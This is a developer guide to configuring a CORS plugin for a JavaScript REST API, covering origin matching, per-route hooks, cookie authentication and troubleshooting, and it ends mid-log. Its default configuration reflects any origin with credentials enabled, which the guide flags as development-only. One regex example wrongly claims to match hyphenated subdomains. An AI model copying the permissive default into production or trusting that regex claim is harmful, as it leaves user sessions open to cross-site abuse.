# CORS Plugin Guide

Cross-Origin Resource Sharing (CORS) is essential for APIs accessed by web browsers. This guide shows you how to use the CORS plugin to enable cross-origin requests in your JSON REST API.

## Table of Contents
1. [Basic Setup](#basic-setup)
2. [Configuration Options](#configuration-options)
3. [Common Use Cases](#common-use-cases)
4. [Advanced Patterns](#advanced-patterns)
6. [Troubleshooting](#troubleshooting)


## Intro: What is CORS

CORS stands for **Cross-Origin Resource Sharing**. It's a security feature implemented by web browsers to protect users from malicious websites.

**The server ALWAYS responds to requests regardless of origin.** CORS is enforced by the BROWSER, not the server. This is a crucial distinction:

- ✅ **Servers**: Always process and respond to requests from any origin
- 🛡️ **Browsers**: Block the response from reaching JavaScript if CORS headers don't allow it
- 🔓 **Non-browser clients** (cURL, Postman, mobile apps): Not affected by CORS at all

By default, web browsers enforce the **Same-Origin Policy**, which blocks web pages from making requests to a different domain than the one serving the page. While this protects users, it also prevents legitimate cross-domain API calls.

For example:
- Your web app is served from `https://myapp.com`
- Your API is hosted at `https://api.myapp.com`
- Without CORS, the browser will block requests from the web app to the API

CORS allows servers to specify which origins (domains) are permitted to access their resources. Here's the flow:

1. **Simple Requests**: For basic GET/POST requests, the browser sends an `Origin` header
2. **Preflight Requests**: For complex requests (custom headers, PUT/DELETE, etc.), the browser first sends an OPTIONS request
3. **Server Response**: The server ALWAYS responds with data + CORS headers
4. **Browser Decision**: The browser either gives the response to JavaScript OR blocks it

Imagine you're building a weather app:
- Frontend: `https://coolweather.app` (your React/Vue/Angular app)
- Backend: `https://api.weather-service.com` (your API)

When a user visits your frontend and it tries to fetch weather data:

```javascript
// This code runs in the browser at https://coolweather.app
fetch('https://api.weather-service.com/forecast')
  .then(res => res.json())
  .then(data => console.log(data));
```

Without CORS headers from the API:
```
✅ API receives the request and sends response
❌ Browser blocks JavaScript from reading the response
❌ Console error: "CORS policy: No 'Access-Control-Allow-Origin' header"
❌ User sees no weather data
🔍 Network tab shows the full response (but JS can't access it)
```

With CORS headers from the API:
```
✅ API receives the request and sends response
✅ API includes: Access-Control-Allow-Origin: https://coolweather.app
✅ Browser allows JavaScript to read the response
✅ User sees weather data
```

**CORS does NOT protect your API from:**
- Direct requests (cURL, Postman, scripts)
- Mobile apps
- Backend-to-backend communication
- Malicious users with browser dev tools
- Web scraping tools

**CORS ONLY protects:**
- Users from having their credentials used by malicious websites
- Browser-based JavaScript from reading responses it shouldn't

**Therefore:** CORS is about protecting users, not protecting your API. You still need:
- Authentication (API keys, tokens)
- Authorization (user permissions)
- Rate limiting
- Input validation

## Basic Setup

The CORS plugin automatically handles preflight requests and adds appropriate headers to all responses.

The basic CORS setup creates a permissive configuration suitable for development:

**What it ALLOWS:**
- ✅ Requests from ANY origin (website, mobile app, Postman, etc.)
- ✅ All standard HTTP methods (GET, POST, PUT, PATCH, DELETE)
- ✅ Credentials (cookies, authorization headers) to be sent
- ✅ Common request headers (Content-Type, Authorization, etc.)
- ✅ Browser to cache preflight responses for 24 hours

**What it BLOCKS:**
- ❌ Nothing - this is the most permissive setup
- ⚠️ This is why it's only recommended for development

**Important Security Note:**
The combination of `origin: '*'` (wildcard) and `credentials: true` is actually invalid according to CORS specification. When credentials are enabled, browsers require a specific origin. The CORS plugin handles this by dynamically setting the origin to match the request.

### Complete Example

Here's a complete API setup with CORS enabled with the most permissive setup:

```javascript
import { Api } from 'hooked-api';
import { RestApiPlugin } from './plugins/core/rest-api-plugin.js';
import { RestApiKnexPlugin } from './plugins/core/rest-api-knex-plugin.js';
import { ExpressPlugin } from './plugins/core/connectors/express-plugin.js';
import { CorsPlugin } from './plugins/core/rest-api-cors-plugin.js';
import express from 'express';
import knex from 'knex';

// Create API instance
const api = new Api({ name: 'my-api', version: '1.0.0' });

// Set up database
const db = knex({
  client: 'sqlite3',
  connection: { filename: ':memory:' },
  useNullAsDefault: true
});

// Install plugins
await api.use(RestApiPlugin);
await api.use(RestApiKnexPlugin, { knex: db });
await api.use(ExpressPlugin, { app: express() });
await api.use(CorsPlugin);

// Add a resource
await api.addScope('articles', {
  restApi: {
    schema: {
      attributes: {
        title: { type: 'string', required: true },
        content: { type: 'string' }
      }
    }
  }
});

// Mount Express routes
const app = express();
api.http.express.mount(app);
app.listen(3000).on('error', (err) => {
  console.error('Failed to start server:', err);
  process.exit(1)
});
```

### The default setup in detail

When you use the basic setup:
```javascript
await api.use(CorsPlugin);
```

It's equivalent to writing:
```javascript
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: '*',
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
    allowedHeaders: [
      'Content-Type',
      'Authorization', 
      'X-Requested-With',
      'X-HTTP-Method-Override',
      'Accept',
      'Origin'
    ],
    exposedHeaders: [
      'X-Total-Count',
      'X-Page-Count', 
      'Link',
      'Location'
    ],
    maxAge: 86400,
    optionsSuccessStatus: 204
  }
});
```

#### `origin: '*'` - Who Can Access Your API
- `'*'` means "any origin" - any website can call your API
- In practice, when `credentials: true`, the plugin dynamically sets this to the requesting origin
- Think of it as saying "I trust everyone" - fine for development, dangerous for production

#### `credentials: true` - Cookies and Authentication
- Allows browsers to send cookies and authorization headers with requests
- Essential for APIs that use cookie-based sessions or need authentication
- Forces the origin to be specific (not wildcard) in responses

#### `methods: [...]` - What Actions Are Allowed
- Lists HTTP methods clients can use
- `GET`: Read data (fetch users, articles, etc.)
- `POST`: Create new resources
- `PUT`: Replace entire resources
- `PATCH`: Update parts of resources
- `DELETE`: Remove resources
- `OPTIONS`: Preflight requests (browser asks "what can I do?")

#### `allowedHeaders: [...]` - What Headers Clients Can Send
- `Content-Type`: Specifies data format (application/json, etc.)
- `Authorization`: For Bearer tokens, API keys
- `X-Requested-With`: Often used to identify AJAX requests
- `X-HTTP-Method-Override`: Allows method override for limited clients
- `Accept`: What response formats the client wants
- `Origin`: Where the request is coming from

#### `exposedHeaders: [...]` - What Headers Clients Can Read
- By default, browsers only let JavaScript read basic headers
- `X-Total-Count`: Total number of items (for pagination)
- `X-Page-Count`: Total number of pages
- `Link`: Pagination links (next, prev, first, last)
- `Location`: Where a newly created resource can be found

#### `maxAge: 86400` - Preflight Cache Duration
- Browsers can cache preflight responses for 86400 seconds (24 hours)
- Reduces preflight requests, improving performance
- During development, you might want this lower (3600 = 1 hour)

#### `optionsSuccessStatus: 204` - Preflight Response Code
- `204 No Content` is the standard for successful OPTIONS
- Tells the browser "yes, you can make this request" without sending body data

## Configuration Options

The CORS plugin accepts various configuration options.

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `origin` | String, RegExp, Array, Function | `'*'` | Allowed origins |
| `credentials` | Boolean | `true` | Allow credentials |
| `methods` | Array | `['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS']` | Allowed HTTP methods |
| `allowedHeaders` | Array | `['Content-Type', 'Authorization', 'X-Requested-With', 'X-HTTP-Method-Override', 'Accept', 'Origin']` | Headers clients can send |
| `exposedHeaders` | Array | `['X-Total-Count', 'X-Page-Count', 'Link', 'Location']` | Headers exposed to clients |
| `maxAge` | Number | `86400` | Preflight cache duration (seconds) |
| `optionsSuccessStatus` | Number | `204` | Status code for successful OPTIONS |

### Configuration Examples

### Understanding Each Configuration Example

Each example below shows different ways to configure CORS for specific scenarios. We'll explain what each does, why you'd use it, and provide real-world context.

#### Specific Origin

**What it does:** Restricts API access to a single, specific domain.

**Real-world scenario:** You have a production API that should only be accessed by your official web application.

```javascript
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: 'https://app.example.com',
    credentials: true
  }
});
```

**How it works:**
- Only requests from `https://app.example.com` will be allowed
- Requests from `https://example.com` (no subdomain) will be BLOCKED
- Requests from `http://app.example.com` (HTTP, not HTTPS) will be BLOCKED
- The browser will receive: `Access-Control-Allow-Origin: https://app.example.com`

**Example scenario:**
Your company's dashboard at `https://dashboard.mycompany.com` needs to access the API at `https://api.mycompany.com`. No other domains should have access.

```javascript
// API configuration
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: 'https://dashboard.mycompany.com',
    credentials: true // Allow cookies for user sessions
  }
});
```

#### Multiple Origins

**What it does:** Allows access from a specific list of domains.

**Real-world scenario:** You have multiple legitimate frontends (main app, admin panel, mobile web) that need API access.

```javascript
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: ['https://app.example.com', 'https://admin.example.com'],
    credentials: true
  }
});
```

**How it works:**
- The plugin checks if the request's origin is in the array
- Only exact matches are allowed
- For each allowed origin, the response includes that specific origin

**Example scenario:**
Your SaaS platform has multiple interfaces:

```javascript
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: [
      'https://app.mysaas.com',      // Main application
      'https://admin.mysaas.com',    // Admin dashboard
      'https://mobile.mysaas.com',   // Mobile web version
      'https://staging.mysaas.com'   // Staging environment
    ],
    credentials: true
  }
});
```

**What happens:**
- Request from `https://app.mysaas.com` → Allowed, gets `Access-Control-Allow-Origin: https://app.mysaas.com`
- Request from `https://blog.mysaas.com` → BLOCKED (not in the list)
- Request from `https://app.mysaas.com:3000` → BLOCKED (port must match exactly)

#### Pattern Matching with RegExp

**What it does:** Uses regular expressions to match origins dynamically.

**Real-world scenario:** You want to allow all subdomains of your main domain, or have a dynamic pattern for customer-specific domains.

```javascript
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: /^https:\/\/.*\.example\.com$/,
    credentials: true
  }
});
```

**How it works:**
- The RegExp `/^https:\/\/.*\.example\.com$/` matches:
  - `^https:\/\/` - Must start with `https://`
  - `.*` - Any characters (subdomain)
  - `\.example\.com$` - Must end with `.example.com`

**What it matches:**
- ✅ `https://app.example.com`
- ✅ `https://staging.example.com`
- ✅ `https://customer1.example.com`
- ✅ `https://api.v2.example.com` (multiple subdomains)
- ❌ `https://example.com` (no subdomain)
- ❌ `http://app.example.com` (HTTP not HTTPS)
- ❌ `https://app.example.org` (wrong TLD)

**Real-world example:** Multi-tenant SaaS where each customer gets a subdomain:

```javascript
// Allow any customer subdomain
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: /^https:\/\/[a-z0-9-]+\.myapp\.com$/,
    credentials: true
  }
});

// This allows:
// https://acme-corp.myapp.com
// https://tech-startup.myapp.com
// https://client-123.myapp.com
```

#### Dynamic Origin Validation

**What it does:** Uses a function to determine if an origin should be allowed, enabling complex logic.

**Real-world scenario:** You need to check origins against a database, implement rate limiting, or apply business logic.

```javascript
const allowedOrigins = new Set([
  'https://app.example.com',
  'https://staging.example.com'
]);

await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: (origin) => {
      // Custom logic to determine if origin is allowed
      return allowedOrigins.has(origin) || origin.endsWith('.trusted.com');
    }
  }
});
```

**How it works:**
- The function receives the origin from each request
- Returns `true` to allow, `false` to block
- Can implement any logic: database checks, pattern matching, time-based rules

**Advanced example with database check:**

```javascript
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: async (origin) => {
      // Check if origin is in our whitelist database
      const isWhitelisted = await db('cors_whitelist')
        .where({ origin, active: true })
        .first();
      
      if (isWhitelisted) return true;
      
      // Check if it's a development environment
      if (origin.includes('localhost') && process.env.NODE_ENV === 'development') {
        return true;
      }
      
      // Check if it's a partner domain
      const partner = await db('partners')
        .where('domain', origin)
        .where('api_access', true)
        .first();
      
      return !!partner;
    }
  }
});
```

**Rate limiting example:**

```javascript
const originRequestCounts = new Map();

await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: (origin) => {
      // Always allow your main domains
      if (origin === 'https://app.example.com') return true;
      
      // Rate limit other origins
      const count = originRequestCounts.get(origin) || 0;
      if (count > 1000) {
        console.warn(`Rate limit exceeded for origin: ${origin}`);
        return false;
      }
      
      originRequestCounts.set(origin, count + 1);
      return true;
    }
  }
});
```

#### Custom Headers

**What it does:** Configures which headers browsers can send to and receive from your API.

**Real-world scenario:** Your API uses custom headers for versioning, feature flags, or tracking.

```javascript
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: '*',
    allowedHeaders: [
      'Content-Type',
      'Authorization',
      'X-API-Key',
      'X-Client-Version'
    ],
    exposedHeaders: [
      'X-Total-Count',
      'X-RateLimit-Limit',
      'X-RateLimit-Remaining',
      'X-Response-Time'
    ]
  }
});
```

**Understanding allowedHeaders:**
These are headers the browser is allowed to include in requests:
- `Content-Type`: Essential for JSON APIs
- `Authorization`: For Bearer tokens, Basic auth
- `X-API-Key`: Custom API key header
- `X-Client-Version`: Track client app versions

**Understanding exposedHeaders:**
By default, JavaScript can only read these response headers: Cache-Control, Content-Language, Content-Type, Expires, Last-Modified, Pragma. Your custom headers need explicit exposure:
- `X-Total-Count`: Total items for pagination
- `X-RateLimit-Limit`: Max requests allowed
- `X-RateLimit-Remaining`: Requests left
- `X-Response-Time`: Performance monitoring

**Real-world example for a versioned API:**

```javascript
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: 'https://app.example.com',
    allowedHeaders: [
      'Content-Type',
      'Authorization',
      'X-API-Version',        // Client specifies API version
      'X-Request-ID',         // For request tracking
      'X-Client-ID',          // Identify different client apps
      'X-Feature-Flags'       // Client-specific features
    ],
    exposedHeaders: [
      'X-API-Version',        // Confirm which version was used
      'X-Deprecated',         // Warn about deprecated endpoints
      'X-Request-ID',         // For debugging
      'X-Cache-Status',       // Was this cached?
      'X-Response-Time',      // Performance metrics
      'Link',                 // Pagination links
      'Warning'               // API warnings
    ]
  }
});
```

## Common Use Cases

These examples show typical CORS configurations for different scenarios you'll encounter in real projects.


### Development Environment

**Purpose:** Maximum flexibility during development, allowing requests from any origin.

**Why you need this:** During development, you might access your API from:
- `http://localhost:3000` (React dev server)
- `http://localhost:8080` (Vue dev server)  
- `http://127.0.0.1:5000` (Python Flask app)
- `http://192.168.1.100:3000` (testing on mobile via local network)
- Browser extensions, Postman, mobile apps, etc.

```javascript
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: '*',
    credentials: true
  }
});
```

**What this enables:**
- ✅ Any developer can work with the API without CORS issues
- ✅ Testing tools (Postman, Insomnia) work without configuration
- ✅ Mobile app developers can test from devices/emulators
- ✅ No need to maintain a whitelist during rapid development

**Security note:** NEVER use this configuration in production. It allows any website to access your API and potentially access user data if they're logged in.

### Production with Known Clients

**Purpose:** Lock down your API to only trusted domains in production.

**Why you need this:** In production, you know exactly which domains should access your API. Restricting access prevents:
- Malicious websites from accessing your API
- Data scraping from unauthorized sources
- CSRF attacks from untrusted origins

```javascript
const isProduction = process.env.NODE_ENV === 'production';

await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: isProduction 
      ? ['https://app.mycompany.com', 'https://admin.mycompany.com']
      : '*',
    credentials: true,
    maxAge: isProduction ? 86400 : 3600
  }
});
```

**What this does:**
- **In Production:** Only `app.mycompany.com` and `admin.mycompany.com` can access the API
- **In Development:** Any origin can access (for convenience)
- **maxAge difference:** Production caches preflight for 24 hours (less requests), development for 1 hour (faster config changes)

**Real-world example with environment configs:**

```javascript
// config/cors.js
const corsConfigs = {
  development: {
    origin: '*',
    credentials: true,
    maxAge: 3600 // 1 hour
  },
  staging: {
    origin: [
      'https://staging.myapp.com',
      'https://preview.myapp.com',
      'https://qa.myapp.com'
    ],
    credentials: true,
    maxAge: 43200 // 12 hours
  },
  production: {
    origin: [
      'https://app.myapp.com',
      'https://www.myapp.com',
      'https://mobile.myapp.com'
    ],
    credentials: true,
    maxAge: 86400 // 24 hours
  }
};

await api.use(CorsPlugin, {
  'rest-api-cors': corsConfigs[process.env.NODE_ENV] || corsConfigs.development
});
```

### Public API without Credentials

**Purpose:** Create a truly public API that anyone can use, like a weather service or data API.

**Why you need this:** Public APIs typically:
- Don't use cookies or session-based auth (use API keys instead)
- Should be accessible from any website
- Need to be cached efficiently by browsers
- Often read-only (GET requests only)

```javascript
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: '*',
    credentials: false,
    methods: ['GET', 'OPTIONS'],
    maxAge: 3600
  }
});
```

**Key differences from default:**
- `credentials: false` - No cookies/auth headers (allows true wildcard)
- `methods: ['GET', 'OPTIONS']` - Read-only API
- `maxAge: 3600` - Shorter cache for easier updates

**Real-world example - Public data API:**

```javascript
// Public cryptocurrency prices API
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: '*',
    credentials: false, // No user-specific data
    methods: ['GET', 'OPTIONS'], // Read-only
    allowedHeaders: [
      'Content-Type',
      'X-API-Key' // Still require API key for rate limiting
    ],
    exposedHeaders: [
      'X-RateLimit-Limit',
      'X-RateLimit-Remaining',
      'X-RateLimit-Reset',
      'X-Data-Source',
      'X-Last-Updated'
    ],
    maxAge: 300 // 5 minutes - data updates frequently
  }
});
```

**What this achieves:**
- Any website can embed your data
- No security risks from credentials
- Browsers can efficiently cache responses
- API keys still work for rate limiting

### Subdomain Wildcard

**Purpose:** Allow all subdomains of your company domain while blocking external sites.

**Why you need this:** Common in organizations where:
- Different teams have different subdomains
- Customer-specific subdomains (tenant1.app.com, tenant2.app.com)
- Environment-based subdomains (dev.app.com, staging.app.com)
- Regional subdomains (us.app.com, eu.app.com, asia.app.com)

```javascript
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: /^https:\/\/([a-z0-9]+[.])*mycompany\.com$/,
    credentials: true
  }
});
```

**What the regex allows:**
- ✅ `https://mycompany.com` (main domain)
- ✅ `https://app.mycompany.com` (single subdomain)
- ✅ `https://staging.app.mycompany.com` (nested subdomains)
- ✅ `https://customer-123.mycompany.com` (with hyphens)
- ❌ `http://app.mycompany.com` (not HTTPS)
- ❌ `https://mycompany.com.evil.com` (domain suffix attack)
- ❌ `https://app.mycompany.co` (wrong TLD)

**More specific examples:**

```javascript
// Only allow specific subdomain patterns
await api.use(CorsPlugin, {
  'rest-api-cors': {
    // Only customer subdomains (customer-xxx.myapp.com)
    origin: /^https:\/\/customer-[a-z0-9]+\.myapp\.com$/,
    credentials: true
  }
});

// Allow multiple levels but require 'app' somewhere
await api.use(CorsPlugin, {
  'rest-api-cors': {
    // Matches: app.mycompany.com, staging.app.mycompany.com, app.eu.mycompany.com
    origin: /^https:\/\/(.+\.)?app(\..+)?\.mycompany\.com$/,
    credentials: true
  }
});

// Different TLDs for different regions
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: (origin) => {
      const allowedPatterns = [
        /^https:\/\/(.+\.)?mycompany\.com$/,      // .com for US
        /^https:\/\/(.+\.)?mycompany\.co\.uk$/,  // .co.uk for UK
        /^https:\/\/(.+\.)?mycompany\.de$/,       // .de for Germany
        /^https:\/\/(.+\.)?mycompany\.jp$/        // .jp for Japan
      ];
      return allowedPatterns.some(pattern => pattern.test(origin));
    },
    credentials: true
  }
});
```

## Advanced Patterns

These patterns show sophisticated CORS configurations for complex real-world scenarios.

### Why These Patterns Matter

1. **Environment-Based**: Different security requirements for dev/staging/prod
2. **Per-Route CORS**: Some endpoints need different CORS rules
3. **Authentication Integration**: CORS and auth systems must work together
4. **Base URL Support**: APIs served from subpaths need special handling

Each pattern solves specific architectural challenges you'll face in production systems.

### Environment-Based Configuration

```javascript
function getCorsConfig() {
  const env = process.env.NODE_ENV;
  
  switch (env) {
    case 'development':
      return {
        origin: '*',
        credentials: true,
        maxAge: 3600 // 1 hour cache in dev
      };
      
    case 'staging':
      return {
        origin: [
          'https://staging.example.com',
          'https://preview.example.com'
        ],
        credentials: true,
        maxAge: 43200 // 12 hours
      };
      
    case 'production':
      return {
        origin: (origin) => {
          // Allow production domains and verified partners
          const allowed = [
            'https://app.example.com',
            'https://www.example.com'
          ];
          
          const partners = getVerifiedPartnerDomains(); // Your logic
          return allowed.includes(origin) || partners.includes(origin);
        },
        credentials: true,
        maxAge: 86400 // 24 hours
      };
      
    default:
      return { origin: 'https://localhost:3000' };
  }
}

await api.use(CorsPlugin, {
  'rest-api-cors': getCorsConfig()
});
```

### Per-Route CORS (Using Hooks)

**Important Understanding:** The CORS plugin is essentially a sophisticated header management system. It:
1. Intercepts requests to check origins
2. Handles OPTIONS preflight requests
3. Adds appropriate headers to responses

Since it works with headers, you can override or extend its behavior using hooks for specific routes.

**Why You'd Need Per-Route CORS:**
- Public endpoints vs authenticated endpoints
- Different security requirements for admin routes
- Partner-specific API endpoints
- Legacy compatibility requirements

```javascript
// Add custom headers for specific routes
api.addHook('transport:response', 'custom-cors', async ({ context }) => {
  const { request, response } = context.transport;
  
  // Add extra CORS headers for admin routes
  if (request.path.startsWith('/api/admin')) {
    response.headers['Access-Control-Allow-Origin'] = 'https://admin.example.com';
    response.headers['Access-Control-Max-Age'] = '7200'; // Shorter cache for admin
  }
});
```

**What This Code Does:**
1. Hooks into the response pipeline AFTER the CORS plugin
2. Checks if the request is for an admin route
3. Overrides the CORS headers for stricter control
4. Sets a shorter cache time for admin preflight requests

**Complete Per-Route Example:**

```javascript
// Different CORS policies for different route types
api.addHook('transport:response', 'route-specific-cors', {
  order: -900 // Run after CORS plugin (which is -1000)
}, async ({ context }) => {
  const { request, response } = context.transport;
  const path = request.path;
  
  // Public data endpoints - most permissive
  if (path.startsWith('/api/public')) {
    response.headers['Access-Control-Allow-Origin'] = '*';
    delete response.headers['Access-Control-Allow-Credentials'];
  }
  
  // Admin endpoints - most restrictive  
  else if (path.startsWith('/api/admin')) {
    const adminOrigins = ['https://admin.example.com'];
    if (adminOrigins.includes(request.headers.origin)) {
      response.headers['Access-Control-Allow-Origin'] = request.headers.origin;
      response.headers['Access-Control-Allow-Credentials'] = 'true';
    } else {
      // Remove CORS headers entirely - block the request
      delete response.headers['Access-Control-Allow-Origin'];
      delete response.headers['Access-Control-Allow-Credentials'];
    }
  }
  
  // Partner endpoints - check partner status
  else if (path.startsWith('/api/partner')) {
    const partnerId = request.params.partnerId;
    const partner = await getPartner(partnerId);
    
    if (partner && partner.allowedOrigins.includes(request.headers.origin)) {
      response.headers['Access-Control-Allow-Origin'] = request.headers.origin;
      response.headers['Access-Control-Expose-Headers'] = partner.exposedHeaders.join(', ');
    }
  }
});
```

**Route-Specific OPTIONS Handling:**

You are able to add route-specific headers by adding a route using the addRoute function:

```javascript
// Custom preflight handling for specific routes
api.addRoute({
  method: 'OPTIONS',
  path: '/api/upload/*',
  handler: async ({ headers }) => {
    // Special CORS for file uploads
    return {
      statusCode: 204,
      headers: {
        'Access-Control-Allow-Origin': headers.origin,
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, Content-Length, X-File-Name',
        'Access-Control-Max-Age': '300' // Only 5 minutes for upload endpoints
      }
    };
  }
});
```

However, this must happen before the CORS plugin is registered, since the order in which URLs are added will matter.

### CORS with Authentication

**The Critical Relationship Between CORS and Authentication**

CORS and authentication are deeply intertwined. When your API uses authentication, CORS configuration becomes security-critical.

**Key Concepts:**

1. **Credentials in CORS** means:
   - Cookies (session cookies, auth cookies)
   - HTTP authentication headers
   - TLS client certificates

2. **The Wildcard Restriction:**
   - When `credentials: true`, you CANNOT use `origin: '*'`
   - The browser requires an exact origin match
   - This prevents malicious sites from using user's cookies

3. **Security Implications:**
   - Wrong CORS + auth = security vulnerability
   - Attackers could make authenticated requests from their sites
   - User's cookies would be automatically included

**How Authentication Flows Work with CORS:**

1. **Login Flow:**
   ```
   1. User visits https://app.example.com
   2. App sends login request to https://api.example.com/auth/login
   3. Browser includes Origin: https://app.example.com
   4. API validates credentials
   5. API sets auth cookie with SameSite=None; Secure
   6. API responds with Access-Control-Allow-Origin: https://app.example.com
   7. API responds with Access-Control-Allow-Credentials: true
   8. Browser stores cookie for api.example.com
   ```

2. **Authenticated Request Flow:**
   ```
   1. App makes request to https://api.example.com/user/profile
   2. Browser automatically includes auth cookie
   3. Browser includes Origin: https://app.example.com
   4. API validates cookie and origin
   5. API responds with user data and CORS headers
   ```

**Common pattern for APIs with authentication:**

```javascript
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: (origin) => {
      // Always allow your known origins
      const knownOrigins = [
        'https://app.example.com',
        'https://mobile.example.com'
      ];
      
      if (knownOrigins.includes(origin)) {
        return true;
      }
      
      // For other origins, you might check against a database
      // return checkOriginInDatabase(origin);
      
      return false;
    },
    credentials: true, // Required for cookies/auth headers
    allowedHeaders: [
      'Content-Type',
      'Authorization',
      'X-CSRF-Token' // If using CSRF protection
    ],
    exposedHeaders: [
      'X-Auth-Token-Expiry',
      'X-Rate-Limit-Remaining'
    ]
  }
});
```

**Complete Authentication Example:**

```javascript
// Full setup for authenticated API
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: (origin) => {
      // Strict origin validation for authenticated endpoints
      const allowedOrigins = [
        'https://app.example.com',
        'https://mobile.example.com',
        process.env.NODE_ENV === 'development' ? 'http://localhost:3000' : null
      ].filter(Boolean);
      
      return allowedOrigins.includes(origin);
    },
    credentials: true, // MUST be true for cookies
    allowedHeaders: [
      'Content-Type',
      'Authorization',     // For Bearer tokens
      'X-CSRF-Token',     // CSRF protection
      'X-Requested-With'  // Ajax detection
    ],
    exposedHeaders: [
      'X-Auth-Expired',   // Tell client when to refresh
      'X-CSRF-Token',     // New CSRF token
      'X-User-Role'       // Client-side authorization
    ],
    maxAge: 7200 // 2 hours - balance security and performance
  }
});

// Cookie configuration (Express example)
app.use(session({
  cookie: {
    sameSite: 'none',  // Required for cross-origin
    secure: true,      // Required with sameSite=none
    httpOnly: true,    // Prevent JS access
    domain: '.example.com' // Share across subdomains
  }
}));
```

**Common Authentication Patterns:**

**Note:** These examples show CORS configuration patterns for different authentication methods. JWT generation itself is not part of this library - you'll use your own authentication service (Supabase, Auth0, Firebase Auth, etc.) or implement your own JWT generation.

1. **JWT with Cookies:**
```javascript
// Secure cookie-based JWT
api.post('/auth/login', async (req, res) => {
  // generateJWT is YOUR function - implement using Supabase, Auth0, etc.
  const token = generateJWT(user);
  res.cookie('auth-token', token, {
    httpOnly: true,
    secure: true,
    sameSite: 'none',
    maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days
  });
});
```

2. **Bearer Token Pattern (No CORS Credentials):**
```javascript
// When using Authorization header instead of cookies
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: '*',  // Can use wildcard without credentials
    credentials: false,  // No cookies needed
    allowedHeaders: ['Authorization', 'Content-Type']
  }
});
```

3. **Hybrid Approach:**
```javascript
// Support both cookies and bearer tokens
api.addHook('transport:request', 'auth-detector', async ({ context, request }) => {
  if (request.headers.authorization) {
    // Bearer token auth - no CORS credentials needed
    context.authType = 'bearer';
  } else if (request.headers.cookie) {
    // Cookie auth - needs CORS credentials
    context.authType = 'cookie';
  }
});
```

### CORS with Base URL

The CORS plugin works seamlessly with Express base paths.

**What Base URL Means:**

A base URL (or base path) prefixes all your API routes. Instead of:
- `/api/users`
- `/api/products`

With base path `/v1`:
- `/v1/api/users`
- `/v1/api/products`

**Why Use Base URLs:**

1. **API Versioning:** `/v1`, `/v2` for different API versions
2. **Proxy Configuration:** Nginx routes `/api` to your Node server
3. **Microservices:** Different services on different paths
4. **CDN/Load Balancer:** Route by path prefix

**How CORS Works with Base URLs:**

The CORS plugin automatically handles the base path. When you set a base path, CORS headers are applied to ALL routes under that path.

```javascript
// Express with base path
await api.use(ExpressPlugin, {
  app: express(),
  basePath: '/v1'  // API served at /v1/api/*
});

// CORS plugin handles the base path automatically
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: 'https://app.example.com'
  }
});

// Client requests to /v1/api/articles will have proper CORS headers
```

**What Happens Behind the Scenes:**

1. Express plugin registers routes with base path:
   - `/v1/api/countries`
   - `/v1/api/users`
   - etc.

2. CORS plugin registers OPTIONS handler for `/v1/*`

3. All requests under `/v1` get CORS headers

**Complete Example with Multiple APIs:**

```javascript
// Serve multiple API versions on same server
const app = express();

// API v1
const apiV1 = new Api({ name: 'my-api-v1' });
await apiV1.use(RestApiPlugin);
await apiV1.use(ExpressPlugin, { 
  app,
  basePath: '/v1' 
});
await apiV1.use(CorsPlugin, {
  'rest-api-cors': {
    origin: ['https://app.example.com', 'https://legacy.example.com']
  }
});

// API v2 with different CORS
const apiV2 = new Api({ name: 'my-api-v2' });
await apiV2.use(RestApiPlugin);
await apiV2.use(ExpressPlugin, { 
  app,
  basePath: '/v2' 
});
await apiV2.use(CorsPlugin, {
  'rest-api-cors': {
    origin: 'https://app.example.com', // v2 doesn't support legacy
    allowedHeaders: ['Content-Type', 'Authorization', 'X-API-Version']
  }
});

// Mount both APIs
apiV1.http.express.mount(app);
apiV2.http.express.mount(app);

// Results:
// GET /v1/api/users - CORS allows legacy.example.com
// GET /v2/api/users - CORS blocks legacy.example.com
```

**Important Notes:**

1. CORS applies to the entire base path, not individual routes
2. You cannot have different CORS settings for routes under the same base path
3. The base path is transparent to CORS origin checks
4. Preflight OPTIONS requests work correctly with base paths

## Troubleshooting

### Common Issues and Solutions

| Issue | Cause | Solution |
|-------|-------|----------|
| "CORS header 'Access-Control-Allow-Origin' missing" | Origin not allowed | Check origin configuration, ensure it matches exactly |
| "Credentials flag is true, but Access-Control-Allow-Credentials is not 'true'" | Credentials mismatch | Ensure `credentials: true` in config |
| "Multiple CORS headers" | Multiple CORS middleware | Ensure CORS plugin is installed only once |
| Preflight fails with 404 | OPTIONS route not registered | Check that CORS plugin is installed after transport plugin |
| Wildcard origin with credentials | Security restriction | Use specific origins when `credentials: true` |

### Debug CORS Issues

Enable debug logging to troubleshoot:

```javascript
const api = new Api({ 
  name: 'my-api',
  log: { level: 'debug' }
});

// The CORS plugin will log:
// - Preflight requests received
// - Origin validation results
// - Headers being set
```

**Example Debug Output:**

```
2024-01-15T10:23:45.123Z [DEBUG] [my-api:plugin:rest-api-cors] CORS OPTIONS request { origin: 'https://app.example.com' }
2024-01-15T10:23:45.124Z [DEBUG] [my-api:plugin:rest-api-cors] CORS processing response {
